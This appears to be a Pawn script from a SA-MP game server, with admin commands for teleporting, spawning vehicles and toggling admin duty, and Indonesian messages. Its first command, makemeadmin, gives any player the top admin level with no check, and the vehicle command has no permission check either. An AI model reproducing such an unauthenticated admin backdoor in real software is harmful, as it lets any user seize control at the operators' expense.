CMD:makemeadmin(playerid, params[])
{
	WW5CData[playerid][pAdmin] = 7;
	return 1;
}

CMD:gotoco(playerid, params[])
{
	if(WW5CData[playerid][pAdmin] >= 2)
	{
		new Float: pos[3], int;
		if(sscanf(params, "fffd", pos[0], pos[1], pos[2], int))
			return SendSyntaxMessage(playerid, "KEGUNAAN: /gotoco [x coordinate] [y coordinate] [z coordinate] [interior]");

		SendClientMessage(playerid, COLOR_WHITE, "Anda telah diteleportasi ke koordinat yang ditentukan.");
		SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		SetPlayerInterior(playerid, int);
	}
	return 1;
}

CMD:veh(playerid, params[])
{
	new
	    model[32],
		color1,
		color2;

	if (sscanf(params, "s[32]I(-1)I(-1)", model, color1, color2))
	    return SendSyntaxMessage(playerid, "/veh [model id/name] <color 1> <color 2>");

	if ((model[0] = GetVehicleModelByName(model)) == 0)
	    return SendErrorMessage(playerid, "Mana Ada Model Kek Gitu Bloks.");

	new
	    Float:x,
	    Float:y,
	    Float:z,
	    Float:a,
		vehicleid;

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);

	vehicleid = CreateVehicle(model[0], x, y + 2, z, a, color1, color2, 0);

	if (GetPlayerInterior(playerid) != 0)
	    LinkVehicleToInterior(vehicleid, GetPlayerInterior(playerid));

	if (GetPlayerVirtualWorld(playerid) != 0)
		SetVehicleVirtualWorld(vehicleid, GetPlayerVirtualWorld(playerid));

	PutPlayerInVehicle(playerid, vehicleid, 0);
	SendServerMessage(playerid, "Lu Spawn Kendaraan %s.", ReturnVehicleModelName(model[0]));
	return 1;
}

CMD:aduty(playerid, params[])
{
    if(WW5CData[playerid][pAdmin] < 1)
        return SendErrorMessage(playerid, "Anda tidak memiliki izin untuk menggunakan perintah ini!");
        
	if(!WW5CData[playerid][pAduty])
	{
	    WW5CData[playerid][pAduty] = true;
	    SetPlayerColor(playerid, 0xFF0000FF);
	    SetPlayerName(playerid, WW5CData[playerid][pUCP]);
	}
	else
	{
	    WW5CData[playerid][pAduty] = false;
	    SetPlayerColor(playerid, COLOR_WHITE);
	    SetPlayerName(playerid, WW5CData[playerid][pName]);
	}
	return 1;
}